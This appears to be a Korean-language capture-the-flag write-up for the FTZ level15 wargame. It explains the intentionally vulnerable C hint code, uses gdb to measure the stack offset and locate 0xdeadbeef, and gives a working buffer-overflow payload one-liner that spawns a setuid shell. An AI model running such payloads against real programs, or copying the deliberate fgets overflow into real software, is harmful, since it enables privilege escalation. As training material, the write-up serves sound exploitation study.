# FTZ Level15

#### ID : level15 PW: guess what
<br>

**먼저 ```ls -l```을 이용해 어떤 파일이 있는지 살펴보자**<br> 
attackme 프로그램에 level15의 권한으로 setuid가 걸려있는 것을 확인할 수 있다.<br><br>
우선 hint의 내용을 보자<br>
```cat hint```<br>
```c
#include <stdio.h>

main()
{
      int crap;
      int *check;
      char buf[20];
      fgets(buf, 45, stdin);      #buf 변수에 45바이트만큼 입력받음
      if (*check==0xdeadbeef)     #check 포인터가 0xdeadbeef면
      {
          setreuid(3096, 3096);
          system("/bin/sh");      #/bin/sh 쉘 실행
      }
}
```
```fgets``` 함수에서 BOF가 일어날 수 있다!!<br>
이전 단계인 level14와 거의 유사한데 다만 check가 포인터변수로 바뀌었다<br>

우리의 목적을 생각해보자.<br>
1. buf[20]에서 *check까지 거리 구하기
2. 0xdeadbeef 주소 알기
3. *check 주소에 0xdeadbeef 덮어씌우기
3. 공격!

**attackme 코드를 디버깅해야하기 때문에 tmp폴더로 복사하자.**<br>
```cp attackme tmp```<br><br>
**그리고 디버깅을 해보자**<br>
```gdb -q attackme```<br>
```disas main```<br>

<main+3>을 보면 0x38만큼의 공간을 만들고 있다. 0x38은 10진수로 56이다.<br>
crap 변수 4bytes, check 변수 4byte, buf 20byte 총 28byte가 필요한데 56byte를 할당했다는 것은 dummy로 28byte가 있다고 생각할 수 있다.<br>
dummy가 어디에 위치해 있는지 찾아봐야겠다.<br>
<main+32>를 보면 0xdeadbeef랑 0xfffffff0를 비교하고 있다.(eax가 0xfffffff0이므로)<br>
저 **0xfffffff0**이 바로 *check의 주소인 것이다. 이는 ebp로부터 -16에 위치하고 있다.<br>
buf는 ebp로부터 -56에 위치하고있고 *check는 -16에 위치하고 있으니<br>
buf에서 *check까지의 거리는 **40**이다.<br>

현재 상태를 나타내보면 다음과 같다.<br>
**buf(20)+dummy(20)+check(4)+crap(4)+dummy(8)+sfp(4)+ret(4)**<br>
*(사실 level14의 스택상태랑 동일하다)*<br>

이제 메모리 상에서 0xdeadbeef가 존재하는 위치를 알아보자.<br>
0x080484b0 <main+32> 에서 0xdeadbeef과 *check를 비교하고 있다. 이 위치의 메모리 데이터 10개를 바이트 단위로 출력해보자.<br>
```x/10x 0x080484b0```<br>
필자의 경우 중간중간에 beef와 dead를 볼 수 있었다. 다만 0xdeadbeef가 아니므로 다음 주소로 가보자.<br>
```x/10x 0x080484b1```<br>
아직 0xdeadbeef가 없다!<br>
```x/10x 0x080484b2```<br>
0x80484b2에서 0xdeadbeef를 볼 수 있다. 0xdeadbeef의 주소가 0x80484b2인 것이다.

그렇다면 우리가 작성할 페이로드는 다음과 같다고 할 수 있다.<br>
**"A"*(buf~check까지 거리)+(0xdeadbeef의 주소)**<br>

**이제 페이로드를 작성해보자.**<br>
```(python -c 'print "A"*40+"\xb2\x84\x04\x08"';cat)|./attackme```<br>
*(주소는 little endian 방식으로 입력된다)*<br>
<br>
```cd ..``` 다시 원래 디렉토리로 되돌아가서<br>
**공격 실시!**<br>
```(python -c 'print "A"*40+"\xb2\x84\x04\x08"';cat)|./attackme```<br>
```my-pass```로 비밀번호를 물어보면<br>
Level16 Password is "~~". 라고 나올 것이다!!
